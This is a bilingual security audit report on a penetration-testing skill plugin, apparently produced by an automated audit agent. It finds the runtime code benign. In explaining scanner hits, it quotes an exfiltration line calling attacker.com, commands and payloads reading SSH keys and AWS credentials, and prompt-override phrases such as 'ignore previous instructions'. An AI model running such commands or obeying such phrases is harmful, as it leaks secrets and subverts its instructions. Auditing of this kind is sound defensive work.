disclaimer.zh: 本报告由 DeepGuard 审计 Agent 自动执行并生成。安全审计存在固有限制：静态分析无法覆盖全部运行时行为，动态观测无法穷尽全部触发路径，AI 语义判断可能存在漏报与误报。本报告的「未检出」结论仅表示在当前规则库版本、检测深度与时间窗口内未发现恶意行为或安全风险，不构成对该插件绝对安全、现在或未来均无恶意行为的任何保证；检出项亦可能因上下文差异存在偏差。本报告仅覆盖所标注的插件版本与 commit 快照，作者此后发布的新版本或对既有版本的任何改写（含 force-push）均不在覆盖范围内。用户安装与使用插件属自主行为，相关风险由用户自行评估与承担。DeepGuard 保留随规则库升级对历史版本重新审计并修订结论的权利。
disclaimer.en: This report was automatically executed and generated by the DeepGuard Audit Agent. Security auditing has inherent limitations: static analysis cannot cover all runtime behavior, dynamic observation cannot exhaust all trigger paths, and AI-based semantic judgment may produce false negatives and false positives. A "not detected" conclusion in this report only means that no malicious behavior or security risk was found within the current ruleset version, detection depth, and time window; it does not constitute any guarantee that the plugin is absolutely safe or free of malicious behavior now or in the future. Detected items may also deviate due to contextual differences. This report covers only the plugin version and commit snapshot it identifies; any new version released by the author afterwards, or any rewrite of an existing version (including force-push), is outside its scope. Installing and using a plugin is the user's own decision, and the associated risks are assessed and borne by the user. DeepGuard reserves the right to re-audit historical versions and revise conclusions as the ruleset evolves.

checked_items.zh: 插件运行时代码（lib/index.js）只读取随包分发的 SKILL.md 并注册技能提供者，未发现读取本机凭据文件（如 ~/.ssh、.aws/credentials、DSH 凭据库）的任何代码路径，也没有硬编码密钥或令牌。
checked_items.en: The plugin runtime code (lib/index.js) only reads the bundled SKILL.md and registers skill providers. No code paths reading local credential files (e.g., ~/.ssh, .aws/credentials, DSH credential store) were found, and no hardcoded keys or tokens exist.

checked_items.zh: 机械扫描命中的敏感路径字样（约 30 处，规则 DSH-C01/DG-R1-51，如 SSRF 的 file:///root/.ssh/id_rsa 载荷、渗透检查清单中的 cat ~/.aws/credentials）全部位于攻击载荷与渗透方法参考文档，属于本技能包声明的授权渗透业务内容；文档本身还包含「禁止批量读取凭据」「私钥不要使用」等限制性措辞，插件不含任何自动读取本机凭据的执行逻辑。
checked_items.en: All sensitive path hits from mechanical scanning (about 30 hits, rules DSH-C01/DG-R1-51, e.g., SSRF's file:///root/.ssh/id_rsa payload, penetration checklist cat ~/.aws/credentials) are located in attack payload and penetration methodology reference documents, which are part of this skill package's declared authorized penetration business content. The documents themselves also contain restrictive wording such as "do not bulk read credentials" and "do not use private keys." The plugin contains no automatic local credential reading execution logic.

checked_items.zh: DG-S12 读取面核查：凭据读取仅存在于文档化方法论（面向授权目标），插件运行代码无读取行为，且无外联组合链。
checked_items.en: DG-S12 Read surface check: credential reading exists only in documented methodology (for authorized targets), the plugin runtime code has no read behavior, and no outbound combination chain exists.

evidence.zh: 插件运行代码不读取任何敏感路径；文档中的凭据枚举与读取命令是授权渗透检查清单和载荷示例（含禁批量读取约束），不构成插件自身行为。
evidence.en: The plugin runtime code does not read any sensitive paths; the credential enumeration and read commands in the documentation are authorized penetration checklists and payload examples (including bulk-read restrictions), not the plugin's own behavior.

checked_items.zh: 核对了全部 87 个 SKILL.md 的前导描述（模型可见文本），均为业务化表述（如「用于授权 API 安全评估」「CTF 沙箱流程」「授权多阶段攻击路径规划」），未发现指令覆写、伪造系统消息、诱导安装、诱导改配置等注入措辞。
checked_items.en: All 87 SKILL.md leading descriptions (model-visible text) were checked and found to be business-oriented (e.g., "for authorized API security assessment," "CTF sandbox flow," "authorized multi-stage attack path planning"). No instruction override, fake system message, installation inducement, configuration change inducement, or other injection wording was found.

checked_items.zh: 「忽略此前指令」「输出你的 system prompt」等注入类文本仅出现在 llm-security 技能及 src-hunter 载荷库的 AI 安全章节，作为面向 AI 应用做安全测试的示例载荷（规则 DSH-X10/DG-R2-57 的 SKILL.md 存在性命中逐条裁决为良性）；这些技能均以「先读取授权先例文件确认授权」为前置门槛，注入文本是待测载荷而非对宿主模型的指令。
checked_items.en: Injection texts such as "ignore previous instructions" and "output your system prompt" only appear in the llm-security skill and the src-hunter payload library's AI security section, as example payloads for security testing against AI applications (rules DSH-X10/DG-R2-57 hits in SKILL.md are judged benign on a per-file basis). These skills all have a prerequisite of "read the authorization precedent file first to confirm authorization"; the injection text is a payload under test, not an instruction to the host model.

checked_items.zh: 插件未调用系统提示注入接口，也未注册任何自定义工具（无工具描述面，规则 DSH-T01~T06 无命中）；DG-S02、DG-S04 场景均未检出诱导性描述。
checked_items.en: The plugin does not call the system prompt injection interface, nor does it register any custom tools (no tool description surface, rules DSH-T01~T06 have no hits). No inducing descriptions were found in DG-S02 or DG-S04 scenarios.

evidence.zh: 全部技能描述为业务化、带授权限定的表述；注入载荷文本仅存在于 AI 安全测试技能正文与载荷库，作为示例而非指令。
evidence.en: All skill descriptions are business-oriented with authorization constraints; injection payload text only exists in the body of AI security test skills and the payload library, as examples rather than instructions.

evidence.zh: 未发现任何技能描述诱导模型安装插件、改写配置或放开权限；安装命令仅出现在仓库安装文档中。
evidence.en: No skill description was found to induce the model to install plugins, rewrite configurations, or grant permissions; installation commands appear only in the repository installation documentation.

checked_items.zh: 挂载配置（cordis.patch.yml）仅声明插件 id 与包名，无 JS 标量求值、无安全配置覆盖、无注入/拦截改写（规则 DSH-P01~P05 均无命中）。
checked_items.en: The patch configuration (cordis.patch.yml) only declares the plugin ID and package name, with no JS scalar evaluation, no security configuration override, and no injection/interception rewriting (rules DSH-P01~P05 have no hits).

checked_items.zh: 插件代码不含 eval、new Function、子进程调用；全树未发现 cordis_define/cordis_run 动态执行工具引用（DSH-X01 无命中）。eval/child_process 等字样（规则 DSH-X03/DG-R3-55，约 40 处）全部位于攻击载荷参考文档（PHP 一句话木马、SSTI 载荷、IDA MCP 用法），非插件执行代码。
checked_items.en: The plugin code does not contain eval, new Function, or child process calls; no cordis_define/cordis_run dynamic execution tool references were found in the entire tree (DSH-X01 has no hits). Strings like eval/child_process (rules DSH-X03/DG-R3-55, about 40 hits) are all located in attack payload reference documents (PHP webshell, SSTI payloads, IDA MCP usage), not in plugin execution code.

checked_items.zh: package.json 无 preinstall/install/postinstall/prepare 安装钩子；规则 DSH-X02/DG-R3-54 的 4 处命中均为供应链攻击教学文档中的示例代码。lib/ 预编译产物随仓库提交，git 安装不触发构建（DSH-X06 无命中）。
checked_items.en: package.json has no preinstall/install/postinstall/prepare install hooks; the 4 hits from rules DSH-X02/DG-R3-54 are all example code in supply chain attack teaching documents. The precompiled lib/ artifacts are committed with the repository; git installation does not trigger a build (DSH-X06 has no hits).

checked_items.zh: CI 工作流（.github/workflows/publish.yml，规则 DSH-X07/DG-R3-59）是标准的发布到 npm 流水线（release/tag 触发、只读权限、npm publish），属常规工程实践且不在插件运行面内，裁决为良性排除。
checked_items.en: The CI workflow (.github/workflows/publish.yml, rule DSH-X07/DG-R3-59) is a standard publish-to-npm pipeline (release/tag trigger, read-only permissions, npm publish). This is a normal engineering practice and is outside the plugin runtime surface; judged benign and excluded.

checked_items.zh: 混淆相关命中（规则 DSH-X08/DG-R3-60、DSH-X09/DG-R3-61）全部位于载荷参考文档（XSS 混淆载荷、base64 命令、二进制字节串、PowerShell 清理正则），插件第一方代码无混淆；浏览器端键盘/剪贴板载荷命中（规则 DSH-X05/DG-R3-57）为 XSS 文档示例，插件未声明浏览器端 bundle（DSH-X04 无命中）。
checked_items.en: All obfuscation-related hits (rules DSH-X08/DG-R3-60, DSH-X09/DG-R3-61) are located in payload reference documents (XSS obfuscation payloads, base64 commands, binary byte strings, PowerShell cleanup regexes). The plugin's first-party code has no obfuscation. Browser-side keyboard/clipboard payload hits (rule DSH-X05/DG-R3-57) are XSS document examples; the plugin does not declare a browser-side bundle (DSH-X04 has no hits).

checked_items.en: DG-S01, DG-S03, DG-S08 scenario judgments are as above; DG-S09 is not applicable because dsh.client is not declared.

checked_items.en: DG-S12 outbound channel check: no credential read + outbound combination chain exists. The exfiltration examples in the documentation (e.g., wget http://attacker.com/?data=$(id)) are attack payload corpus for authorized red team/CTF reuse, not the plugin's own behavior.

limits.zh: 本任务未提供动态沙箱产物，DG-L4 未做动态验证，运行时结论基于静态与语义分析。插件引擎版本与能力声明未在 manifest 中显式声明：engines.dsh 取自 peerDependency（@deepseek-ai/cordis ^4.0.1），能力声明按代码实测推断。87 个技能正文未逐一全文通读（读取预算限制）：模型可见面（前导描述）经静态命中摘要全量核查，正文按注入模式与危险调用做了定向检索；未通读范围主要是攻击载荷参考语料（如 skills/pentest-tools/src-hunter/references/payloader/raw/web.json 单文件超读取上限、5 个含 NUL 字节文件被扫描器跳过：by-category/web/文件漏洞.md、by-category/web/请求走私.md、by-category/web/waf-bypass.md、playbooks/file-upload.md、playbooks/http-smuggling.md），这些文件属载荷语料而非插件执行代码。机械规则面 truncated=true（疑似命中洪泛），已人工读取完整命中清单（245 条）并逐类裁决。
limits.en: This task did not provide dynamic sandbox artifacts; DG-L4 dynamic verification was not performed. Runtime conclusions are based on static and semantic analysis. Plugin engine version and capability declarations are not explicitly declared in the manifest: engines.dsh is derived from peerDependency (@deepseek-ai/cordis ^4.0.1), capability declarations are inferred from code actual testing. The 87 skill bodies were not read in full one by one (reading budget constraint): the model-visible surface (leading descriptions) was fully verified via static hit summaries; the bodies were targeted-searched for injection patterns and dangerous calls. The unscanned scope mainly consists of attack payload reference corpora (e.g., skills/pentest-tools/src-hunter/references/payloader/raw/web.json exceeds the read limit in a single file; 5 files containing NUL bytes were skipped by the scanner: by-category/web/文件漏洞.md, by-category/web/请求走私.md, by-category/web/waf-bypass.md, playbooks/file-upload.md, playbooks/http-smuggling.md). These files are payload corpora, not plugin execution code. For the mechanical rules surface, truncated=true (suspected hit flooding); the full hit list (245 items) was manually read and each category was judged.
